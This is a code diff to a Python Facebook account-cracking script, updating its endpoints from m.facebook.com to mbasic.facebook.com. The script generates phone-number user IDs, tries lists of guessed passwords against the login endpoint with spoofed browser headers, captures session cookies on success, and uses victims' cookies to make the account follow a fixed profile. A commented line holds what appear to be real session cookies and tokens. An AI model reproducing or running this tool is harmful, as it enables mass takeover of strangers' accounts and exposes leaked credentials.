@@ -18,7 +18,7 @@ except ModuleNotFoundError:
     os.system('pip install bs4')
 
 def cek_apk(session,coki):
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -30,7 +30,7 @@ def cek_apk(session,coki):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         else:
             print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -47,10 +47,10 @@ def cek_apk(session,coki):
 
 
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100091439918932', {
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100091439918932', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://m.facebook.com' + str(get), {
+        session.get('https://mbasic.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
             
             
@@ -548,11 +548,11 @@ def bd():
             pwx = [code+psx,code+psx[:2],psx[6:],psx[:6],'57273200','59039200','57575751','57575752']
             #pwx = [psx]
             HKR.submit(rcrack,uid,pwx,tl)
-#m.facebook.com
-#m.facebook.com
-#m.facebook.com
-#m.facebook.com
-#m.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
 #datr=vdNxZXtKMcByKKbUDacgpPS0;sb=vtNxZXNUBS7gryVCapzUPLJr;fr=0Tqsb3ul9voBrlZlB..BlcdO-.-Y.AAA.0.0.Blcd
 W='\33[1;32m'
 def ind():
@@ -582,14 +582,14 @@ def ind():
         print(50*'_')
         for psx in user:
             uid = '+91'+code+psx
-            pwx = [code+psx,code+psx[:2],psx[6:],psx[:6],'57273200','59039200']
+            pwx = [code+psx,code+psx[:2],'57273200','57575751','59039200','57575752']
             #pwx = [psx]
             HKR.submit(rcrack,uid,pwx,tl)
-#m.facebook.com
-#m.facebook.com
-#m.facebook.com
-#m.facebook.com
-#m.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
 #datr=vdNxZXtKMcByKKbUDacgpPS0;sb=vtNxZXNUBS7gryVCapzUPLJr;fr=0Tqsb3ul9voBrlZlB..BlcdO-.-Y.AAA.0.0.Blcd
 W='\33[1;32m'
 def rcrack(uid,pwx,tl):
@@ -604,7 +604,7 @@ def rcrack(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -615,14 +615,13 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-    'authority': 'm.facebook.com',
+            header_freefb ={
+    'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=kmmjZcQiTtospSW677oQ0Alf; sb=kmmjZW7gW9ogVGpN9dskVM8v; m_pixel_ratio=3; locale=en_GB; vpd=v1%3B664x360x3; wd=360x664; fr=0JmucsMqNr3K8lAfF.AWWsbjErniHPr3e2k4WNV9y8VZQ.Blo2mS.Nf.AAA.0.0.Blo234.AWXidvWWRKo',
+    # 'cookie': 'datr=kmmjZcQiTtospSW677oQ0Alf; sb=kmmjZW7gW9ogVGpN9dskVM8v; locale=en_GB; vpd=v1%3B664x360x3; m_pixel_ratio=3; wd=360x664; fr=0JmucsMqNr3K8lAfF.AWUpiPRNwxvIMRzV5zpsLGbtdZw.Blo2mS.Nf.AAA.0.0.Blo4Zk.AWXl2Y2WjEA; c_user=100056097094641; xs=44%3AcHn3vaWsfDXpTg%3A2%3A1705215588%3A-1%3A4863; fbl_st=100435136%3BT%3A28420259; fbl_cs=AhBRKjWXufWCXZEjZa%2FZ08%2FxGE45Q00vZVBZN3dKNW04am52SWg5UE9KNQ; fbl_ci=550722896080687; m_page_voice=100056097094641',
     'dpr': '3',
-    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfdTNJANaMdAQtagVBg3zNRU8G0aQscOPOO12RUEv75voawydZai0RcEMOQIWkF7hLVGQCZJQn1Ux-Q_Yfzhew-9SNGQB5k0pC_iJMMCOd5CcQ&smuh=14690&lh=Ac8S5FZRWCi4D0OA5jo&wtsid=rdr_1DyT3JR2jlaU9PuyN&_rdr',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
@@ -632,12 +631,12 @@ def rcrack(uid,pwx,tl):
     'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': pro,}
 
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
